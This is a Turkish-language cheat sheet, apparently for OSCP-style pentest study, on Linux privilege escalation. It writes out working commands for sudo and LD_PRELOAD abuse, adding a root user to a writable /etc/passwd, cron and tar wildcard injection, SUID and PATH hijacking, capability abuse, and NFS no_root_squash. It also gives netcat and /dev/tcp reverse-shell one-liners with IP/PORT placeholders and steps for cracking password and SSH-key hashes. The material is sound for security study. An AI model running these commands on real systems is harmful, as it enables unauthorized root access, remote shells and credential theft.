
# Linux Privilege Escalation Notları

Bu not, Linux sistemlerde düşük yetkili bir kullanıcıdan yetkili kullanıcıya (root) geçiş yapmak için kullanılan temel saldırı vektörlerini (privilege escalation vectors) ve OSCP/Pentest metodolojisini içerir.

## 1. Sudo Yetkilerini Kötüye Kullanma (Sudo Privileges)

Kullanıcının `sudo` komutu ile hangi işlemleri şifresiz (NOPASSWD) veya şifreli yapabildiğini kontrol etmek ilk adımdır.

- **Keşif (Reconnaissance):** `sudo -l` komutu çalıştırılarak yetkiler listelenir.
- **Kabuk Atlatma (Shell Escape Sequences):** Listelenen komutlar [GTFOBins](https://gtfobins.github.io/) üzerinden aratılarak komut satırından sisteme sızma (shell) elde edilebilir. Örn: `sudo vim -c '!sh'`

### Ortam Değişkenleri (Environment Variables - env_keep)
Eğer `sudo -l` çıktısında `env_keep+=LD_PRELOAD` veya `env_keep+=LD_LIBRARY_PATH` görünüyorsa:
- **LD_PRELOAD:** Kendi derlediğimiz zararlı bir C kütüphanesini (shared object - `.so`) çalıştırılacak programdan *önce* belleğe yükleyerek komut çalıştırılmasını sağlarız.
  - C kodu (shell.c) yazılır: `#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }`
  - Derlenir: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
  - İstismar: `sudo LD_PRELOAD=/tmp/shell.so <sudo-ile-çalışan-herhangi-bir-program>`
- **LD_LIBRARY_PATH:** Dinamik kütüphanelerin arandığı yolları (path) değiştirerek, meşru bir programın sahte kütüphanemizi (hijacking) çalıştırmasını sağlarız. Programın hangi kütüphaneleri çağırdığını görmek için `ldd <program_yolu>` kullanılır.

## 2. Zayıf Dosya İzinleri (Weak File Permissions)

Sistemdeki kritik dosyaların yanlış yapılandırılması sonucu okuma/yazma (read/write) izinlerinin suistimal edilmesidir.

- **`/etc/shadow` Dosyası:** Sadece (root) tarafından okunabilir olmalıdır. Eğer düşük yetkili kullanıcı tarafından okunabiliyorsa (readable), şifre özetleri (hashes) alınır. Kırmak için `/etc/passwd` dosyası da alınıp Kali'de `unshadow passwd shadow > unshadowed.txt` yapılır ve ardından `hashcat` veya `john` ile çevrimdışı kırma (offline cracking) uygulanır.
- **`/etc/passwd` Dosyası:** Eğer dosya yazılabilir (writable) durumdaysa, doğrudan `0:0` (root UID ve GID) yetkilerine sahip yeni bir kullanıcı ekleyebiliriz.
  - Şifre üretimi: `openssl passwd -1 -salt hacker password123`
  - Dosyaya eklenecek satır: `hacker:$1$hacker$Tz....:0:0:root:/root:/bin/bash`
  - Kullanıcıya geçiş: `su hacker`

## 3. Zamanlanmış Görevler (Cron Jobs)

Sistemde belirli aralıklarla otomatik çalışan (cron jobs) betiklerin ve sistem genelindeki (`/etc/crontab`) yapılandırmaların incelenmesi gerekir.

- **Dosya İzinleri (File Permissions):** (Cron) tarafından çalıştırılan bir betik (script) bizim tarafımızdan yazılabilir (writable) durumdaysa, içine ters bağlantı (reverse shell) komutu (`bash -i >& /dev/tcp/IP/PORT 0>&1`) veya SUID bit ekleme komutu yazılabilir.
- **PATH Değişkeni Değiştirme (PATH Variable Hijacking):** `/etc/crontab` dosyasındaki `PATH=` satırı (örneğin `PATH=/tmp:/bin:...` ise) incelenir. (Cron) içinde tam yolu (absolute path) verilmeyen bir komut varsa (örn: `overwrite.sh`), `/tmp` dizininde aynı isimde zararlı bir dosya oluşturup çalıştırılması sağlanır.
- **Joker Karakterler (Wildcards):** `tar`, `chown`, `chmod` gibi komutlar (cron) içinde `*` (wildcard) ile çalıştırılıyorsa, argüman enjeksiyonu (argument injection) yapılabilir.
  - Örnek `tar` sömürüsü (checkpoint abuse):
    - `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f" > shell.sh`
    - `touch /hedef/dizin/--checkpoint=1`
    - `touch /hedef/dizin/--checkpoint-action=exec=sh\ shell.sh`
    - Tar komutu `*` yüzünden bu dosyaları parametre olarak algılar ve shell çalışır.

## 4. SUID / SGID Dosyaları

Çalıştırıldığında dosyayı çalıştıranın değil, dosya sahibinin (owner - genellikle root) yetkileriyle çalışan (SUID - `s` biti) dosyalardır.

- **Keşif (Discovery):** `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
- **Bilinen Zafiyetler (Known Exploits):** Bulunan olağandışı SUID dosyalarının versiyonlarına göre (Searchsploit / Exploit-DB) üzerinden istismar kodları aranabilir (Örn: eski exim4 veya pkexec/PwnKit).
- **Paylaşımlı Nesne Enjeksiyonu (Shared Object Injection):** SUID dosyası çalışırken var olmayan bir (shared object `.so`) dosyasını arıyorsa (`strace <dosya>` ile tespit edilir), o isimde zararlı bir kütüphane derlenip aranan yola (path) yerleştirilir.
- **PATH Değişkeni Suistimali (PATH Hijacking):** SUID dosyası, içindeki bir aracı (örn: `service`, `cat`) tam yol kullanmadan çağırıyorsa;
  - Kendi `/tmp` dizinimizde bir `cat` dosyası oluştururuz (İçine `/bin/bash` yazarız).
  - Terminalin PATH'ini değiştiririz: `export PATH=/tmp:$PATH`
  - SUID dosyayı çalıştırdığımızda `/bin/cat` yerine bizim yazdığımız `/tmp/cat` (root yetkisiyle) çalışır.
  - **OSCP Notu (ÖNEMLİ):** Eğer sistemde `/bin/sh`, `dash` kabuğuna sembolik bağlıysa (Ubuntu sistemlerde varsayılandır), `dash` SUID yetkilerini (EUID) otomatik olarak düşürür (drop privileges). SUID dosyanın içindeki payload SUID `bash` çağırmıyorsa (veya C kodunda `setuid(0)` yapılmamışsa) yetki yükselmez.

## 5. Linux Capabilities (Yetki Modülleri)

Tüm (root) yetkilerini vermek yerine (SUID gibi), sadece belirli işlemleri yapabilmesi için dosyalara atanan ince ayarlı yetkilerdir. SUID'den daha gizlidir, gözden kaçabilir.

- **Keşif (Discovery):** `getcap -r / 2>/dev/null`
- **Suistimal:** Örneğin `python3` dosyasında `cap_setuid+ep` yetkisi varsa, bu dosya root olmadan da UID değiştirebilir demektir.
  - İstismar: `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`
  - Referans için yine GTFOBins "Capabilities" sekmesi kullanılır.

## 6. Şifreler ve Anahtarlar (Passwords & Keys)

Sistemde unutulmuş, gizlenmiş veya yanlış yapılandırılmış hassas verilerin toplanması (credential hunting / enumeration).

- **Geçmiş Dosyaları (History Files):** `cat ~/.bash_history`, `cat ~/.mysql_history` ile kullanıcının komut geçmişi incelenir.
- **Yapılandırma Dosyaları (Config Files):** `/var/www/html/` içindeki `wp-config.php`, veritabanı dosyaları, `.ovpn` dosyaları veya `/etc/fstab` içindeki cifs şifreleri aranır.
- **SSH Anahtarları (SSH Keys):** `~/.ssh/id_rsa` bulunursa alınır. Anahtar şifreliyse (passphrase), Kali'de `ssh2john id_rsa > hash.txt` ile hash'i çıkartılıp `john` ile kırılır.

## 7. NFS (Network File System) Root Squashing

Dosya paylaşımlarının yapıldığı sistemlerde (NFS), paylaşılan dizinlerin yapılandırması (`/etc/exports`) incelenir.

- **No Root Squash Zafiyeti:** Varsayılan olarak NFS, (root) kullanıcısının oluşturduğu dosyaları "nfsnobody" kullanıcısına çevirir (Root Squashing). Eğer `/etc/exports` dosyasında bir dizin `no_root_squash` parametresi ile paylaşılmışsa bu güvenlik önlemi devre dışıdır.
- **İstismar Adımları:**
  1. (Attacker) makinede hedef dizin mount edilir: `sudo mount -o rw,vers=3 <hedef_IP>:/paylasilan_dizin /tmp/mount`
  2. (Attacker) makinede (root) olarak bir C dili payload'u (setuid(0) içeren bir bash çağıran kod) yazılır ve derlenir.
  3. SUID biti eklenir: `chmod +s payload`
  4. (Target) makineye düşük yetkili kullanıcıyla dönülür, paylaşılan dizindeki `payload` çalıştırılır. SUID biti (root) olarak ayarlandığı için (target) makinede (root shell) elde edilir.

## 8. Çekirdek İstismarları (Kernel Exploits)

Sistemdeki zayıf yapılandırma bulunamadığında başvurulacak son çaredir (sistemi çökertme / kernel panic riski vardır).

- **Keşif:** `uname -a` (Kernel versiyonu), `cat /etc/issue` (Dağıtım versiyonu).
- **Otomatize Araçlar:** Hedefe `linpeas.sh` veya `Linux-Exploit-Suggester (LES)` yüklenerek zafiyetli çekirdek sürümü (DirtyCOW, PwnKit, DirtyPipe vb.) tespit edilir.
- Çalışan (Exploit) kaynak kodları hedef makinede derlenir (gcc) ve çalıştırılır.